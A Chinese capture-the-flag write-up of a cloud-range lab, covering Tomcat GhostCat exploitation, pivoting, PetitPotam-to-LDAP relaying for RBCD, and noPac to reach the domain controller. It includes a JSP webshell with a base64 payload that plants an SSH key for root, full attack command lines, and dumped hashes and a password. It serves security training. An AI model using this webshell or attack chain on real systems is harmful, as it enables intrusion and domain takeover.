# 赏金猎人:IChunQiu云境-Spoofing Writeup

> 原文: https://www.ctfiot.com/89262.html
> ID: 89262

赏金猎人:IChunQiu云境-Spoofing Writeup

Author:Xiaoli-小离

0x00 – Intro

• 2022年12月5号开始，于次日获得一血，斩获1000元奖励

0x01 – Info

• Tag: Tomcat，NTLM，WebClient，Coerce Authentication，noPac

0x02 – Recon

1. Target external ip47.92.146.66

2. Nmap results

Focus on port 8009 (ajp) ，意味着是tomcat (对应了靶场的tomcat tag)

3. 目录扫描，404页面显示为tomcat 9.0.30

4. Playing with Ghost cat 使用该项目测试 https://github.com/00theway/Ghostcat-CNVD-2020-10487

读取/web-inf/web.xml

url-pattern 结果存为字典

FFuf

关注uploadservlet

上传temp.txt

返回文件地址

./upload/7dbbdee357b4472f5aad6b8ce83980dd/20221206093440839.txt

替换 ./upload to /upload，成功读取到上传的文件python3 ajpShooter.py http://47.92.146.66:8080 8009 /upload/7dbbdee357b4472f5a

ad6b8ce83980dd/20221206093440839.txt read

0x03 – GhostCat命令执行

1. 准备好 shell.txt

<% java.io.InputStream in = Runtime.getRuntime().exec(“bash -c {echo,ZWNobyAic3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDL3NKaDY4Uk5hWktLakNQaE40WUxpSnJ4eDR3N3JtbDBGcFRmMTNYNHVKZlpFZm4yU25scE9rdXQ0OE1LdURHOEtDcXczRW0zNU9odXdUa2p3ZEkvRGhGN3ZSeTB0T2xtWDE5NmJHcXpndE5pM1YzUHExc3NCMzV5Ui85SHJ6ZjVEdHdqS2NKdkphV0RuZzU2UWhHZjlnR21vdUZVQWV2QjdsUWl3a01FNWNxTzVsQTRwUm5KVEh2RU1OQUkxQkc3MTBEeWNKT28rNGh1TGNNVjZhdUs3UXdKTWdnN0oyU2U5TEpGZWk2R2g0amJUSGRhdmNBVjV6VVJZeFI4QVNXSmNqY29tM2dMUEE1UWNxSzNzSERRVmswUHllaTR3cEJwWWlFUGlHcHlQR2Y1T3ErUU0xQmJyR0gvTlRBYnZWa3dDZnBkRURWdVBNNWhHOFY4c09HTjIxczlWazFjMVBXaEh2WDZ1ejhRaDRNdUdnQlRYSHlZb3duTjg3OTExVDVGR0VjVzlWeUh1cm9FSVJtdE9sY3dBYmRMc0k0NVhOS1o0aWoxdERLNTRTMmpXWXhJTjhSL1ZuUnV2RVVoTVpGOUlabDM3UW5EQnBFR25LTXFjTVE4cHVUZUJBMngvSURHMFR6MWxjVGk5WHp5WjVheTd4dTJwZStidXhWT1BSQ2M9IiA+PiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cwoKY2htb2QgNjAwIC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCg==}|{base64,-d}|{bash,-i}”).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(“”); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(“”);%>

2. 上传shell.txt

3. 执行上传的代码

4. SSH – flag01

0x04 – 入口 Ubuntu: 172.22.11.76

1. SSH

2. 没啥东西，直接过

3. 开代理

4. 挂代理扫445，获取到三台主机信息 172.22.11.45 XR-Desktop.xiaorang.lab 172.22.11.6 xiaorang-dc.xiaorang.lab 172.22.11.26 XR-LCM3AE8B.xiaorang.lab

5. 关注172.22.11.45 – windows7 – MS17

6. MS17 一气呵成

7. 基本操作

凭据列表

Administrator 4430c690b4c1ab3f4fe4f8ac0410de4a – (本地凭据)

John 03cae082068e8d55ea307b75581a8859 – (本地凭据)

XR-DESKTOP$ 3aa5c26b39a226ab2517d9c57ef07e3e – (域凭据)

yangmei 25e42ef4cc0ab6a8ff9e3edbbda91841 – xrihGHgoNZQ (明文) – (域凭据)

本人已经试过组合爆破了，没有东西，这边直接略过演示，直接到域渗透环节

8. Flag2

9. 把域用户yangmei加入该机器的本地管理员

10. 确定域控IP为172.22.11.6 – xiaorang-dc

11. Bloodhound收集

0x05 – 域渗透环节, 入口 XR-Desktop: 172.22.11.45

• 这边快速过一下 (一句话总结：不能直接拿下域控)

1. 使用Bloodhound收集到的用户名组合获取到的密码/hashes组合爆破，没发现其他新用户

2. MAQ = 0，加不了计算机

3. 当前LDAP 没 TLS，远程也加不了计算机，impacket的addcomputer有两种方法samr和ldaps。samr受到MAQ = 0的限制，无法添加计算机；ldaps受到 没TLS + MAQ = 0 的限制

4. 域控存在nopac，当前用户yangmei使用nopac没打死，并且对域内computer container没有createchild的ACL

5. 域控存在nopac，当前用户yangmei对当前windows机器xr-desktop没WriteDacl权限，意味着无法修改SamAccountName

6. 域内存在 DFscoerce 和 petitpotam，但是不存在CVE-2019-1040，因此放弃 DFscoerce，优先使用petitpotam

7. NoPac exploit: https://github.com/Ridter/noPac

1. Petitpotam 扫描

2. 无ADCS + Petitpotam + ntlm中继打法

攻击链：用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD)

• 满足条件，目标机器需要开启webclient服务

WebClient扫描，确定只能拿下 172.22.11.26 (XR-LCM3AE8B)

• 中继攻击前言：

• 实战中的中继打法只需要停掉80占用服务，开启端口转发（portfwd，CS在后续版本中添加了rportfwd_local，直接转发到客户端本地）

• 本次演示类似实战的打法，不选择把impacket丢到入口ubuntu上面这种操作

3. 中继攻击环境配置: 端口转发 + 代理

我们目前需要把服务器的80，转发到客户端本地的80

• 注意：由于SSH的反向端口转发监听的时候只会监听127.0.0.1，所以这时候需要点技巧

如图所示，即使反向端口转发79端口指定监听全部 (-R *:79:127.0.0.1:80)，端口79依旧绑定在了127.0.0.1（图中顺便把socks5代理也开了）

加多一条socat，让流量 0.0.0.0:80 转发到 127.0.0.1:79，再反向转发回客户端本地的80 ,变相使80监听在0.0.0.0

测试，从172.22.11.76:80 进来的流量直接转发到了我们本地

本地开启ntlmrelayx

• 注意：

• 前面提到，没有ldaps，所以不能使用addcomputer

• 同时在使用proxychains后，ldap://后面只能接dc的ip

• 利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD

sudo proxychains4 -q -f proxychains.conf ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user 'xr-desktop$' --delegate-access

4. 使用Petitpotam触发 XR-LCM3AE8B 认证到172.22.11.76 (ubuntu)

proxychains4 -q -f ~/HTB/Spoofing/proxychains.conf python3 PetitPotam.py -u yangmei -p 'xrihGHgoNZQ' -d xiaorang.lab ubuntu@80/pwn.txt XR-LCM3AE8B

可以看到，已经完成RBCD攻击了，接下来就是直接申请XR-LCM3AE8B的银票了 !

5. 申请XR-LCM3AE8B CIFS票据

0x06 – 域渗透环节 – NoPAC, 入口 XR-LCM3AE8B：172.22.11.26

1. psexec

• flag03在 C:usersadministratorflagflag03.txt (这里没截图)

2. smbclient.py 传 mimikatz

3. 获取到新凭据zhanghui 1232126b24cdf8c9bd2f788a9d7c7ed1

4. nopac

• 只有zhanghui能成功，zhanghui在MA_Admin组，MA_Admin组对computer 能够创建对象，但是在bloodhound没看到 AdFind.exe -b "CN=Computers,DC=xiaorang,DC=lab" nTSecurityDescriptor -sddl+++

Bloodhound看不到，主要原因是没把CreateChild采集进json

5. 回到nopac，加上 create-child 参数

0x07 – 域渗透环节 – xiaorang-dc

1. 使用nopac申请到的cifs票据登录进入DC

• flag04在 C:usersadministratorflagflag04.txt (这里没截图)

1. 域管 (略过使用mimikatz) administrator 0fadb57f5ec71437d1b03eea2cda70b9

0x08 – 瞎玩

1. 尝试解决Bloodhound.py采集不到CreateChild

bloodhound/enumeration/acls.py里面其实已经定义好了变量，只需要调用即可

来到170行，我们添加上去，找到CreateChild就添加进数据

重新跑一遍bloodhound.py，观察containers的结果，发现已经有相关数据了，RID 1132 = MA_Admin组

Bloodhound示意图，但是数据还是乱

原文始发于微信公众号（Gcow安全团队）：赏金猎人:IChunQiu云境-Spoofing Writeup

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1672539652.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1672539653.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1672539654.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1672539655.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1672539656.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1672539657.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1672539658.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1672539659.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1672539659.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1672539660.png)